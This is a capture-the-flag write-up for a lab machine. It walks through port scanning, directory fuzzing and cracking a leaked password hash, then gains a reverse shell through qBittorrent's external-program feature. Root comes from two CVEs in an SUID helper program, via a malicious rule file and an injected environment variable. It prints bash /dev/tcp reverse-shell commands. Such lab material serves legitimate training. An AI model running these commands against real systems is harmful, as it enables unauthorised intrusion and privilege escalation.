# Shitness torrent WriteUP
## 1. Reconnaissance
Let's start with port scanning.
```sh
sudo nmap -sC -sV -v <ip>
```

Ok, we can see 3 open ports: 22 ssh, 80 Apache and 8080 another http. This is the answer to the first question.

Now, let's check the web servers.

Default Apache page.

And qbittorrent-nox.

Let's try to bruteforce Apache.
```sh
ffuf -w <your_wordlist> -u http://<ip>/FUZZ
```

We can see `/notes` url. Go to it.

2 files. In todo.txt we have a hint.

We need to find a hash from torrent web ui, and we have another url `m@il5_secr3t`.

We can see several emails.

The most interesting is `msg_11052026.eml`, it has the hash. Let's decrypt it. For example, using CrackStation

Pass is `lilkillah`. Let's try to log in with `admin` login.

Ok, we're in the torrent webui. 

# 2. Initial foothold
Qbittorrent has a `Run external program on torrent add`, so let's use it for rshell.
```sh
/bin/bash -c "/bin/bash -i >& /dev/tcp/<ip>/4444 0>&1"
```

And add some magnet url.

We got shell.

Let's see on `/home`.

Bingo! We could see an `authorized_keys` permission misconfig, so let's use it.

We're debian user. Let's get a user flag.

## 3. Escalation to root
Let's see on debian's files.

We have a hint, machine has old version of `theshit` program. Let's see on it.

SUID-bit, nice! Let's see on its version and find CVEs.

Ok, there are two CVEs: `CVE-2025-69257` and `CVE-2026-21882`. Let's try both.
```sh
echo "import sys

def match(*a): 
    print(open('/root/root.txt').read(), file=sys.stderr)

def fix(*b): 
    ..." > .config/theshit/fix_rules/active/q.py
shit
```

Next, let's try second CVE.
```sh
SH_PREV_CMD='/bin/bash -c "/bin/bash -i >& /dev/tcp/<ip>/4444 0>&1"' theshit fix
```

